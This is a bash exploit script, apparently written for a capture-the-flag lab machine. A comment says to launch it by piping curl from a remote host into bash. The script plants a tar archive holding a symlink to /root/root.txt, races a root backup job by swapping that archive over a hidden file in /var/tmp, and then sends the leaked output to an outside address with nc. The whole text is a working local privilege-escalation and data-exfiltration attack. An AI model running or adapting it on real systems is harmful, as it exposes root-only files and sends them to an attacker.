#!/bin/bash

# call with: curl http://10.10.14.97:80/backuperer-exploit/exploit.sh | bash
cd /dev/shm

# prep malicious tar
mkdir -p evil/var/www/html
# ln -s /root/root.txt evil/var/www/html/root.txt
ln -s /root/root.txt evil/var/www/html/robots.txt
tar zcvf /dev/shm/evil.tar.gz -C evil .

# wait for backup to appear, then swap
while true; do
    f=$(find /var/tmp -maxdepth 1 -name ".*" -type f 2>/dev/null)
    if [ -n "$f" ]; then
        cp /dev/shm/evil.tar.gz "$f"
        echo "[+] Swapped $f"
        break
    fi
    sleep 1
done

# wait for integrity check
sleep 35

cat /var/backups/onuma_backup_error.txt 
cat /var/backups/onuma_backup_error.txt | nc 10.10.14.97 4443

